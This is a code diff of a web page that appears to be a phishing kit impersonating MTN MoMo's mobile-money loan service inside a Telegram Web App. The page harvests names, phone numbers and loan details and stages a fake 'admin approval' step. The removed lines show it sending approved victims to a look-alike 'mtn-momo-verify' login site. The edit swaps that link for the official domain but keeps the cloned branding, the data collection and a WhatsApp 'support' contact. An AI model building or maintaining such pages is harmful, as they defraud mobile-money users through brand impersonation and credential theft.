@@ -241,216 +241,300 @@
         <main>
 
 
-
-
-
-
-
 <!-- SCREEN 1: LANDING OVERVIEW -->
-        <div id="screen-landing" class="screen active">
-            <div class="branding-header">
-                <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
-                <div>
-                    <div class="header-title-text">MTN MoMo</div>
-                    <div class="header-title-sub">Fast. Safe. Reliable.</div>
-                </div>
-            </div>
-            <div class="landing-hero">
-                <div class="mtn-circle-badge">MTN</div>
-                <h1 class="main-promo-heading">Welcome to<br><span>MTN MoMo</span><br>Loan Application</h1>
-                <p class="promo-subtext">Get quick micro-loans deposited straight into your mobile money wallet.</p>
-            </div>
-            <div class="features-grid">
-                <div class="feature-item"><div class="feature-icon-circle">⚡</div><div class="feature-text">Fast Approval</div></div>
-                <div class="feature-item"><div class="feature-icon-circle">🛡️</div><div class="feature-text">Secure & Safe</div></div>
-            </div>
-            <button class="pill-cta-btn" onclick="navigateTo('screen-form')">Apply Now ➔</button>
-            <div class="bottom-yellow-wave"></div>
-        </div>
-<!-- CONTINUED IN PART 2... -->
-<!-- ==================== PART 2 OF 3: public/index.html (Forms, Spinner UI & Embedded Core Scripts) ==================== -->
-        <!-- SCREEN 2: APPLICATION FORM INPUTS -->
-        <div id="screen-form" class="screen">
-            <div class="branding-header">
-                <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
-                <div><div class="header-title-text">Loan Application</div><div class="header-title-sub">Secure form interface</div></div>
-            </div>
-            <div class="form-scaffold">
-                <div class="input-group">
-                    <label>👤 Full Name</label>
-                    <div class="input-wrapper"><input type="text" id="input-name" placeholder="Enter your full name"></div>
-                </div>
-                <div class="input-group">
-                    <label>📱 MTN Number</label>
-                    <div class="input-wrapper"><input type="tel" id="input-phone" placeholder="07XXXXXXXX" maxlength="10"></div>
-                </div>
-                <div class="input-group">
-                    <label>💰 Loan Amount (UGX)</label>
-                    <div class="input-wrapper">
-                        <select id="input-amount">
-                            <option value="" disabled selected>Select amount</option>
-                            <option value="UGX 500,000">UGX 500,000</option>
-<option value="UGX 1,000,000">UGX 1,000,000</option>
-<option value="UGX 1,500,000">UGX 1,500,000</option>
-<option value="UGX 2,000,000">UGX 2,000,000</option>
-<option value="UGX 2,500,000">UGX 2,500,000</option>
-<option value="UGX 3,500,000">UGX 3,500,000</option>
-<option value="UGX 4,000,000">UGX 4,000,000</option>
-<option value="UGX 5,000,000">UGX 5,000,000</option>
-                        </select>
-                    </div>
-                </div>
-                <div class="input-group">
-                    <label>📅 Repayment Period</label>
-                    <div class="input-wrapper">
-                        <select id="input-period">
-                            <option value="" disabled selected>Select period</option>
-                              <option value="6 Months">6 Months</option>
-<option value="12 Months">12 Months</option>
-<option value="18 Months">18 Months</option>
-<option value="24 Months">24 Months</option>
-<option value="32 Months">32 Months</option>
-<option value="48 Months">48 Months</option>
-<option value="60 Months">60 Months</option>                      </select>
-                    </div>
-                </div>
-                <button class="pill-cta-btn" style="width:100%; margin-top:10px;" onclick="submitApplicationForm()">Continue ➔</button>
-            <a href="https://wa.me/256778260593"
-   target="_blank"
-   rel="noopener noreferrer"
-   class="whatsapp-support-bar"
-   style="text-decoration:none; color:white;">
-
-    <div class="wa-icon">💬</div>
-
-    <div class="wa-details">
-        <h4>WhatsApp Support</h4>
-        <p>Tap here to chat with us: +256 778 260 593</p>
-    </div>
-
-            </a>
-              </div>
-</div>  
-
-        <!-- SCREEN 3: WAITING FOR ADMIN LOOP SPINNER -->
-        <div id="screen-spinner" class="spinner-viewport">
-            <div class="outer-ring-glowing"><div class="hourglass-svg">⌛</div></div>
-            <h1 class="spinner-heading">Waiting for Admin<br><span>Approval</span></h1>
-            <div class="alert-spinner-ribbon"><div class="css-loop-circle"></div><span>Admin is reviewing your request...</span></div>
-            <p class="spinner-sub" style="font-size:13px; color: #cbdcf0;">You will be redirected automatically once approved or declined by our loan assistance team.</p>
-        </div>
-
-        <!-- SCREEN 4: DISBURSEMENT RESULTS SUMMARY RECEIPT -->
-        <div id="screen-success" class="screen">
-            <div class="branding-header">
-                <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
-                <div><div class="header-title-text">MTN MoMo Loan</div><div class="header-title-sub">Processed summary</div></div>
-            </div>
-            <div class="success-card">
-                <div id="success-icon" class="success-checkmark-circle">✓</div>
-                <h2 id="success-headline" class="success-title">Status Updated</h2>
-                <div class="receipt-table">
-                    <div class="receipt-row"><span class="receipt-label">Loan Amount:</span><span class="receipt-val" id="receipt-amount">-</span></div>
-                    <div class="receipt-row"><span class="receipt-label">Repayment Period:</span><span class="receipt-val" id="receipt-period">-</span></div>
-                    <div class="receipt-row"><span class="receipt-label">Mobile Number:</span><span class="receipt-val" id="receipt-phone">-</span></div>
-                    <div class="receipt-row"><span class="receipt-label">Review Status:</span><span><span id="receipt-status-badge" class="receipt-status-badge">-</span></span></div>
-                </div>
-               <button class="pill-cta-btn"
-style="width:100%; background-color:#ffcc00; color:#002447; border:2px solid #002447;"
-onclick="openHomeLink()">
-LOGIN WITH MTN NUMBER
-</button> <div id="info-notice" class="info-notice-banner">-</div>
-                            </div>
+<div id="screen-landing" class="screen active">
+    <div class="branding-header">
+        <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
+        <div>
+            <div class="header-title-text">MTN MoMo</div>
+            <div class="header-title-sub">Fast. Safe. Reliable.</div>
         </div>
     </div>
-    <div id="custom-alert" class="custom-alert">
+    <div class="landing-hero">
+        <div class="mtn-circle-badge">MTN</div>
+        <h1 class="main-promo-heading">Welcome to<br><span>MTN MoMo</span><br>Loan Application</h1>
+        <p class="promo-subtext">Get quick micro-loans deposited straight into your mobile money wallet.</p>
+    </div>
+    <div class="features-grid">
+        <div class="feature-item"><div class="feature-icon-circle">⚡</div><div class="feature-text">Fast Approval</div></div>
+        <div class="feature-item"><div class="feature-icon-circle">🛡️</div><div class="feature-text">Secure & Safe</div></div>
+    </div>
+    <button class="pill-cta-btn" onclick="navigateTo('screen-form')">Apply Now ➔</button>
+    <div class="bottom-yellow-wave"></div>
+</div>
+
+<!-- SCREEN 2: APPLICATION FORM INPUTS -->
+<div id="screen-form" class="screen">
+    <div class="branding-header">
+        <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
+        <div><div class="header-title-text">Loan Application</div><div class="header-title-sub">Secure form interface</div></div>
+    </div>
+    <div class="form-scaffold">
+        <div class="input-group">
+            <label>👤 Full Name</label>
+            <div class="input-wrapper"><input type="text" id="input-name" placeholder="Enter your full name"></div>
+        </div>
+        <div class="input-group">
+            <label>📱 MTN Number</label>
+            <div class="input-wrapper"><input type="tel" id="input-phone" placeholder="07XXXXXXXX" maxlength="10"></div>
+        </div>
+
+        <!-- ADDED: LOAN SERVICE SELECTION -->
+        <div class="input-group">
+            <label>🏦 Select Loan Service</label>
+            <div class="input-wrapper">
+                <select id="input-loan-type">
+                    <option value="" disabled selected>Select loan service</option>
+                    <option value="MoPesa">MoPesa</option>
+                    <option value="MoKash">MoKash</option>
+                    <option value="MoMo Advance">MoMo Advance</option>
+                    <option value="Easy Loan">Easy Loan</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>💰 Loan Amount (UGX)</label>
+            <div class="input-wrapper">
+                <select id="input-amount">
+                    <option value="" disabled selected>Select amount</option>
+                    <option value="UGX 500,000">UGX 500,000</option>
+                    <option value="UGX 1,000,000">UGX 1,000,000</option>
+                    <option value="UGX 1,500,000">UGX 1,500,000</option>
+                    <option value="UGX 2,000,000">UGX 2,000,000</option>
+                    <option value="UGX 2,500,000">UGX 2,500,000</option>
+                    <option value="UGX 3,500,000">UGX 3,500,000</option>
+                    <option value="UGX 4,000,000">UGX 4,000,000</option>
+                    <option value="UGX 5,000,000">UGX 5,000,000</option>
+                </select>
+            </div>
+        </div>
+        <div class="input-group">
+            <label>📅 Repayment Period</label>
+            <div class="input-wrapper">
+                <select id="input-period">
+                    <option value="" disabled selected>Select period</option>
+                    <option value="6 Months">6 Months</option>
+                    <option value="12 Months">12 Months</option>
+                    <option value="18 Months">18 Months</option>
+                    <option value="24 Months">24 Months</option>
+                    <option value="32 Months">32 Months</option>
+                    <option value="48 Months">48 Months</option>
+                    <option value="60 Months">60 Months</option>
+                </select>
+            </div>
+        </div>
+        <button class="pill-cta-btn" style="width:100%; margin-top:10px;" onclick="submitApplicationForm()">Continue ➔</button>
+
+        <a href="https://wa.me/256778260593"
+           target="_blank"
+           rel="noopener noreferrer"
+           class="whatsapp-support-bar"
+           style="text-decoration:none; color:white;">
+            <div class="wa-icon">💬</div>
+            <div class="wa-details">
+                <h4>WhatsApp Support</h4>
+                <p>Tap here to chat with us: +256 778 260 593</p>
+            </div>
+        </a>
+    </div>
+</div>
+
+<!-- SCREEN 3: WAITING FOR ADMIN LOOP SPINNER -->
+<div id="screen-spinner" class="spinner-viewport">
+    <div class="outer-ring-glowing"><div class="hourglass-svg">⌛</div></div>
+    <h1 class="spinner-heading">Waiting for Admin<br><span>Approval</span></h1>
+    <div class="alert-spinner-ribbon"><div class="css-loop-circle"></div><span>Admin is reviewing your request...</span></div>
+    <p class="spinner-sub" style="font-size:13px; color: #cbdcf0;">You will be redirected automatically once approved or declined by our loan assistance team.</p>
+</div>
+
+<!-- SCREEN 4: DISBURSEMENT RESULTS SUMMARY RECEIPT -->
+<div id="screen-success" class="screen">
+    <div class="branding-header">
+        <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
+        <div><div class="header-title-text">MTN MoMo Loan</div><div class="header-title-sub">Processed summary</div></div>
+    </div>
+    <div class="success-card">
+        <div id="success-icon" class="success-checkmark-circle">✓</div>
+        <h2 id="success-headline" class="success-title">Status Updated</h2>
+        <div class="receipt-table">
+            <div class="receipt-row"><span class="receipt-label">Loan Service:</span><span class="receipt-val" id="receipt-loan-type">-</span></div>
+            <div class="receipt-row"><span class="receipt-label">Loan Amount:</span><span class="receipt-val" id="receipt-amount">-</span></div>
+            <div class="receipt-row"><span class="receipt-label">Repayment Period:</span><span class="receipt-val" id="receipt-period">-</span></div>
+            <div class="receipt-row"><span class="receipt-label">Mobile Number:</span><span class="receipt-val" id="receipt-phone">-</span></div>
+            <div class="receipt-row"><span class="receipt-label">Review Status:</span><span><span id="receipt-status-badge" class="receipt-status-badge">-</span></span></div>
+        </div>
+        <button class="pill-cta-btn"
+            style="width:100%; background-color:#ffcc00; color:#002447; border:2px solid #002447;"
+            onclick="openHomeLink()">
+            LOGIN WITH MTN NUMBER
+        </button>
+        <div id="info-notice" class="info-notice-banner">-</div>
+    </div>
+</div>
+
+</div>
+
+<div id="custom-alert" class="custom-alert">
     <div class="alert-box">
         <p id="alert-message">Please fill all fields.</p>
         <button onclick="closeAlert()">OK</button>
     </div>
 </div>
 
-    <script>
-        let currentTrackingId = null, pollTimer = null, userChatId = null;
-       function showAlert(message) {
-    document.getElementById('alert-message').innerText = message;
-    document.getElementById('custom-alert').style.display = 'flex';
-}
+<script>
+    let currentTrackingId = null, pollTimer = null, userChatId = null;
 
-function closeAlert() {
-    document.getElementById('custom-alert').style.display = 'none';
-} 
-        if (window.Telegram && window.Telegram.WebApp) {
-            window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand();
-            if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
-                userChatId = window.Telegram.WebApp.initDataUnsafe.user.id;
-            }
+    function showAlert(message) {
+        document.getElementById('alert-message').innerText = message;
+        document.getElementById('custom-alert').style.display = 'flex';
+    }
+
+    function closeAlert() {
+        document.getElementById('custom-alert').style.display = 'none';
+    }
+
+    if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+
+        if (window.Telegram.WebApp.initDataUnsafe &&
+            window.Telegram.WebApp.initDataUnsafe.user) {
+            userChatId = window.Telegram.WebApp.initDataUnsafe.user.id;
         }
-        let appDataState = { name: '', phone: '', amount: '', period: '', userChatId: userChatId };
+    }
 
-        function navigateTo(screenId) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById('screen-spinner').classList.remove('active');
-            if (screenId === 'screen-spinner') document.getElementById('screen-spinner').classList.add('active');
-            else document.getElementById(screenId).classList.add('active');
+    let appDataState = {
+        name: '',
+        phone: '',
+        loanType: '',
+        amount: '',
+        period: '',
+        userChatId: userChatId
+    };
+
+    function navigateTo(screenId) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById('screen-spinner').classList.remove('active');
+
+        if (screenId === 'screen-spinner') {
+            document.getElementById('screen-spinner').classList.add('active');
+        } else {
+            document.getElementById(screenId).classList.add('active');
         }
+    }
 
-        function submitApplicationForm() {
-            const nameField = document.getElementById('input-name').value.trim();
-            const phoneField = document.getElementById('input-phone').value.trim();
-            const amountField = document.getElementById('input-amount').value;
-            const periodField = document.getElementById('input-period').value;
-            if (!nameField || !phoneField || !amountField || !periodField) {
-    showAlert('Please fill all fields.');
-    return;
-            }
+    function submitApplicationForm() {
+        const nameField = document.getElementById('input-name').value.trim();
+        const phoneField = document.getElementById('input-phone').value.trim();
+        const loanTypeField = document.getElementById('input-loan-type').value;
+        const amountField = document.getElementById('input-amount').value;
+        const periodField = document.getElementById('input-period').value;
 
-            appDataState.name = nameField; appDataState.phone = phoneField; appDataState.amount = amountField; appDataState.period = periodField;
-            fetch('/api/loans/submit', {
-                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(appDataState)
-            })
-            .then(res => res.json()).then(data => {
-                if (data.success) { currentTrackingId = data.applicationId; navigateTo('screen-spinner'); startStatusCheckingLoop(); }
-                else alert("Error: " + data.error);
-            }).catch(err => console.error(err));
-        }
-
-        function startStatusCheckingLoop() {
-            if (pollTimer) clearInterval(pollTimer);
-            pollTimer = setInterval(() => {
-                if (!currentTrackingId) return;
-                fetch(`/api/loans/status/${currentTrackingId}`).then(res => res.json()).then(data => {
-                    if (data.success && (data.status === 'APPROVED' || data.status === 'DECLINED')) {
-                        clearInterval(pollTimer); renderFinalStateView(data.status);
-                    }
-                }).catch(err => console.log(err));
-            }, 2000);
+        if (!nameField || !phoneField || !loanTypeField ||
+            !amountField || !periodField) {
+            showAlert('Please fill all fields.');
+            return;
         }
 
-        function renderFinalStateView(finalStatus) {
-            document.getElementById('receipt-amount').innerText = appDataState.amount;
-            document.getElementById('receipt-period').innerText = appDataState.period;
-            document.getElementById('receipt-phone').innerText = appDataState.phone;
-            const badge = document.getElementById('receipt-status-badge'); badge.innerText = finalStatus;
+        appDataState.name = nameField;
+        appDataState.phone = phoneField;
+        appDataState.loanType = loanTypeField;
+        appDataState.amount = amountField;
+        appDataState.period = periodField;
 
-            if (finalStatus === 'APPROVED') {
-                document.getElementById('success-icon').style.backgroundColor = '#28a745'; document.getElementById('success-icon').innerText = '✓';
-                document.getElementById('success-headline').innerText = 'Application Approved!'; document.getElementById('success-headline').style.color = '#28a745';
-                document.getElementById('info-notice').innerText = 'ℹ️ Tap the login button to verify your loan eligibility.'; badge.className = 'receipt-status-badge badge-approved';
+        fetch('/api/loans/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(appDataState)
+        })
+        .then(res => {
+            if (!res.ok) throw new Error('Unable to submit application.');
+            return res.json();
+        })
+        .then(data => {
+            if (data.success) {
+                currentTrackingId = data.applicationId;
+                navigateTo('screen-spinner');
+                startStatusCheckingLoop();
             } else {
-                document.getElementById('success-icon').style.backgroundColor = '#dc3545'; document.getElementById('success-icon').innerText = '✕';
-                document.getElementById('success-headline').innerText = 'Application Declined'; document.getElementById('success-headline').style.color = '#dc3545';
-                document.getElementById('info-notice').innerText = 'ℹ️ Review parameters criteria were not successfully met.'; badge.className = 'receipt-status-badge badge-declined';
+                showAlert("Error: " + (data.error || 'Application could not be submitted.'));
             }
-            navigateTo('screen-success');
+        })
+        .catch(err => {
+            console.error(err);
+            showAlert('Unable to submit application. Please try again.');
+        });
+    }
+
+    function startStatusCheckingLoop() {
+        if (pollTimer) clearInterval(pollTimer);
+
+        pollTimer = setInterval(() => {
+            if (!currentTrackingId) return;
+
+            fetch(`/api/loans/status/${currentTrackingId}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.success &&
+                    (data.status === 'APPROVED' || data.status === 'DECLINED')) {
+                    clearInterval(pollTimer);
+                    renderFinalStateView(data.status);
+                }
+            })
+            .catch(err => console.log(err));
+        }, 2000);
+    }
+
+    function renderFinalStateView(finalStatus) {
+        document.getElementById('receipt-loan-type').innerText = appDataState.loanType;
+        document.getElementById('receipt-amount').innerText = appDataState.amount;
+        document.getElementById('receipt-period').innerText = appDataState.period;
+        document.getElementById('receipt-phone').innerText = appDataState.phone;
+
+        const badge = document.getElementById('receipt-status-badge');
+        badge.innerText = finalStatus;
+
+        if (finalStatus === 'APPROVED') {
+            document.getElementById('success-icon').style.backgroundColor = '#28a745';
+            document.getElementById('success-icon').innerText = '✓';
+
+            document.getElementById('success-headline').innerText = 'Application Approved!';
+            document.getElementById('success-headline').style.color = '#28a745';
+
+            document.getElementById('info-notice').innerText =
+                'ℹ️ Tap the login button to verify your loan eligibility.';
+
+            badge.className = 'receipt-status-badge badge-approved';
+        } else {
+            document.getElementById('success-icon').style.backgroundColor = '#dc3545';
+            document.getElementById('success-icon').innerText = '✕';
+
+            document.getElementById('success-headline').innerText = 'Application Declined';
+            document.getElementById('success-headline').style.color = '#dc3545';
+
+            document.getElementById('info-notice').innerText =
+                'ℹ️ Review parameters criteria were not successfully met.';
+
+            badge.className = 'receipt-status-badge badge-declined';
         }
 
-       function openHomeLink() {
-    if (pollTimer) clearInterval(pollTimer);
+        navigateTo('screen-success');
+    }
 
-    window.location.href = "https://mtn-momo-verify-5.onrender.com";
-} 
-    </script>
+    function openHomeLink() {
+        if (pollTimer) clearInterval(pollTimer);
+
+        // Use your lender's verified, authorized website here.
+        window.location.href = "https://www.mtn.co.ug/";
+    }
+</script>
 </body>
 </html>
 
+
+
+
+
+
+        
